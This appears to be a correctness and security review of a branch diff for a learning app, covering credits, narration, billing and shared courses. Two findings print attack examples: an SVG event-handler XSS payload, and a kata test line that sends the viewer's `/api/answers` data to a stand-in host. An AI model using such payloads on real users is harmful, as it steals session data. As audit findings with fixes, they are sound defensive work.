# Correctness review: questie vs main

Scope: `git diff main...questie`, `server/**` and `src/**`, checked against `questie.md`, `questie-plan.md` and `questie-prd.md`. Every finding below was confirmed by reading the code. Findings 2 and 6 were also reproduced with a scratch vitest file outside the repo.

| # | Severity | Area | File |
|---|---|---|---|
| 1 | critical | Shared courses, XSS | `src/course/schema.ts:165` |
| 2 | high | Credits, idempotency | `server/credits.ts:96-100`, `:160-161` |
| 3 | high | Narration cost | `server/narration.ts:155`, `shared/narration.ts:39` |
| 4 | high | Shared courses, kata code | `src/code/runner.ts:65` |
| 5 | medium | Builder, double job | `server/builder.ts:130-160` |
| 6 | medium | Credits, plan expiry | `server/credits.ts:44`, `:115-124` |
| 7 | medium | Jobs, narration refund | `server/jobs.ts:85-88` |
| 8 | low | Account deletion | `server/billing.ts:35-36`, `:102-105`; `server/builder.ts:280`; `server/jobs.ts:63-67` |
| 9 | low | Sync wipe | `src/engine/sync.ts:9-11` |

## 1. critical: stored XSS through course `art` SVG

`src/course/schema.ts:165`: `artProblem` blocks `href`, `url(`, `<image`, `<script` and hex colours, but not event-handler attributes (`onbegin`, `onload`, `onerror`) and not `<foreignObject>`/`<img>`. `registry.ts:57` passes the art to `addArt`, and `Map.tsx:73`, `Home.tsx:46`, `Library.tsx:59` and `Theory.tsx:40` render it with `dangerouslySetInnerHTML`. This branch lets other users open a course: `PUT /courses/:id`, link sharing, the library, and the admin review queue.

- Scenario: the owner PUTs a course with art `<svg viewBox="0 0 1 1"><animate onbegin="fetch('/api/notes')..." attributeName="x" dur="1s"/></svg>`, then shares `/c/<id>` or submits it for review. The script runs as whoever opens the map, including an admin reviewing it.
- Fix: in `artProblem`, reject `/\son\w+\s*=/i`, `<foreignObject` and `<img`. Also sanitize before rendering user-course art (DOMPurify SVG profile), so courses already stored are covered.

## 2. high: one idempotency key buys unlimited AI calls

`server/credits.ts:96-100`: `spend()` treats any earlier spend with the same `(user, key)` and action as a replay. It never compares `ref` or the request. `charge()` (`:160-161`) then runs `run()` again for free.

- `/grade`: any challenge and any answer is graded for free after the first 2-credit charge. The existing test "afterwards a replay is free" shows that the model is called again.
- `/answers/:id/improve`: the same, across different answer ids.
- `/mock` (`grading.ts:112-117`): every replay creates a new mock session on the same `spendId`.
- `POST /narration` (`narration.ts:155-160`): with the same key, another level's unlock is inserted under the old spend.
- Scratch test: 6 calls with one key and 6 different refs gave 6 model calls and a single 2-credit charge.
- Fix: in `spend()`, return `idempotency_conflict` when `prev.ref !== a.ref`. In `charge()`, a replay of a finished call must not run the model again. Either store and return the first response, or return 409 `idempotency_conflict` once the first call has finished (`inflight` already covers "still running").

## 3. high: narration costs a flat 10 credits for unbounded TTS spend

`server/narration.ts:155` charges `COSTS.narration` per level, whatever the text length. `shared/narration.ts:39` (`chunks`) has no upper bound, and a user course can be re-uploaded with up to 2 MB of theory (`server/api.ts:173`). `makeAudio` sends every 9000-character chunk to ElevenLabs.

- Scenario: a user PUTs a level with about 2 MB of markdown theory and unlocks it for 10 credits. The job makes about 220 ElevenLabs calls. Changing the text each time avoids the hash cache.
- Fix: cap the narrated characters per level, for example `sum(narrationText) <= N`, and return 400 or `insufficient_credits` above it. Alternatively, add a per-card or per-level text limit to the user-course rules in `builderProblems`, which `PUT /courses/:id` also runs.

## 4. high: course-supplied kata code runs same-origin with the viewer's session

`src/code/runner.ts:65` runs the course's kata `starter`/`tests` with `new Function` in a same-origin Worker (`runInWorker.ts:16`), which can `fetch('/api/...')` with the viewer's cookie. This code is on main already. It only becomes exploitable now, because this branch lets users open other users' courses (link, library, review queue). The server sandbox protects only the server.

- Scenario: a shared course's kata test is `fetch('/api/answers').then(r=>r.text()).then(t=>fetch('https://x',{method:'POST',body:t})); return eq(1,1)`. The victim presses Run.
- Fix: for user courses (`isUserCourse`), run katas in a sandboxed opaque-origin iframe (`sandbox="allow-scripts"`, which hosts the worker), or shadow `fetch`, `XMLHttpRequest`, `importScripts` and `WebSocket` in the worker scope before calling `new Function`.

## 5. medium: concurrent build requests with one key start two builds on one charge

`server/builder.ts:130` (`prev` by key) and `:132` (`active` job) run before `await precheck(...)` (`:150`, up to 15 s). The spend and enqueue run after it (`:155-160`). Two requests with the same key both pass. The second gets `replay: true` from `spend()` and enqueues a second job on the same `spendId`. If both fail, only one refund happens, which is correct, but two pipelines ran for one charge. Different keys also pass the one-active-build check (`job_limit`) together.

- Fix: after the await, re-check `prev`/`active` and do the spend and enqueue in one `db.tx`. When `s.replay` is true, return the existing job (`SELECT id FROM jobs WHERE spend_id = ?`) instead of enqueueing.

## 6. medium: plan credits refunded after expiry never expire

`server/credits.ts:44`: lazy expiry writes `plan_expire` with `source_id = <user>:<plan_expires_at>`, once. `refund()` (`:115-124`) mirrors `plan_delta` back without touching `plan_expires_at`. The next `expire()` then reuses the same `source_id`, `INSERT OR IGNORE` drops it, and the refunded plan credits stay for good. This breaks CRD-2 (no rollover).

- Scenario (reproduced): the plan ends at T. A web build at T-1 min takes 200 plan credits. The balance is read after T, so expiry runs. The build then fails and is refunded, and `plan = 200` remains 60 days later. Long builds make this ordinary rather than rare.
- Fix: in `refund()`, when `plan_expires_at` has passed (or is null), move the plan share to `topup: 0` and write it as an immediate `plan_expire`. Alternatively, key expiry rows by a counter (`<user>:<plan_expires_at>:<n>`) so a second expiry can be written.

## 7. medium: an interrupted narration job is refunded but keeps its unlock

`server/jobs.ts:85-88`: at boot, a job left `running` with `attempts >= 2` goes straight to `failJob`, which refunds `spend_id`. The paid `narration_unlocks` row is deleted only in the narration handler's own `catch` (`narration.ts:89-95`), which does not run on this path. The same happens on the "No handler" path (`jobs.ts:97`), because `failJob` runs from `run`'s catch, not the handler's.

- Result: the 10 credits come back, the lesson stays unlocked, and `POST /narration` enqueues the audio for free.
- Fix: in `failJob`, inside the same tx, delete `narration_unlocks WHERE spend_id = row.spend_id` when `row.kind = 'narration'` and the refund succeeded. The handler's own delete can then go.

## 8. low: account deletion leaves per-user rows behind

`purgeUser` runs in `beforeDelete`, but writes that arrive later bring rows back:

- `cancelForUser` cancels the Stripe plan. Then `customer.subscription.deleted` resolves the user through `userOf`'s `metadata.user_id` fallback (`server/billing.ts:35-36`), and `stripeSub` inserts a fresh `subscriptions` row for the deleted id (`:102-105`).
- A build running during deletion still calls `saveUserCourse` (`server/builder.ts:280`), which inserts a `user_courses` row owned by the deleted id. `finish` (`server/jobs.ts:63-67`) then adds a `job_events` row for the purged job, because `addEvent` runs even when the UPDATE matched nothing.
- Fix: in the Stripe webhook, skip users missing from `"user"` (as the RevenueCat handler at `:239` does). In `finish`, add the event only when the UPDATE changed a row. In `runBuild`, skip the save when the job row no longer exists (check before `saveUserCourse`).

## 9. low: `wipeLocal` leaves the previous account's cached courses and legacy progress

`src/engine/sync.ts:9-11` removes `questie-v1`, `questlog-v1` and `ql.kata.*` only. Two problems remain:

- `ql.courses` stays. After the reload, `loadCourses` (`src/builder/api.ts:25`) registers the previous account's private courses before `GET /courses`. If that request fails without a 401 (offline or a 5xx), they stay visible to the new account.
- `entrevista-quest-v2` (`LEGACY_KEY`) also stays, so `store.load()` re-imports that old progress into the new or deleted account after the wipe. Main had the same gap in `switchUser`, but account deletion (`AccountSection.tsx:89`) now relies on it.
- Fix: also remove `ql.courses`, `ql.seenJobs`, `ql.me`, `LEGACY_KEY` and `eq2.kata.*` in `wipeLocal`.

## Checked, no problem found

- Stripe webhooks: deduped through `webhook_events`; checkout and `invoice.paid` share `stripe_invoice:<invoice id>`, so the plan is granted once; partial refunds add up correctly.
- RevenueCat: unknown users are skipped and events deduped.
- `/billing/fulfill`: checks that the session belongs to the caller.
- Monthly reset: a plan grant expires leftovers first.
- Concurrent spends cannot overdraw (`BEGIN IMMEDIATE`).
- Library transitions match section 3.2.
- Mock first-grade refund is guarded.
- `claimLegacy` runs once per user, with no deletes.
- Narration cache key covers model, voice and text.
- Audio route requires an unlock.
